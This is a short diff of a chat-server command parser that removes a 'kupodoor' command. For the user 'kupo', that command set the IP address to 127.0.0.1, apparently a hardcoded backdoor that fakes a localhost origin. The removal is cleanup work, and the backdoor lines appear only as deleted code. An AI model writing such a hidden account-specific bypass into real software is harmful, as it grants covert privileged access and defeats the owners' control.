@@ -2467,11 +2467,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			return false;
 		}
 		break;
-	case 'kupodoor':
-		if(user.userid === 'kupo' && user.authenticated)
-			user.ip = '127.0.0.1';
-		return false;
-		break;
 
 	case 'timer':
 		target = toId(target);
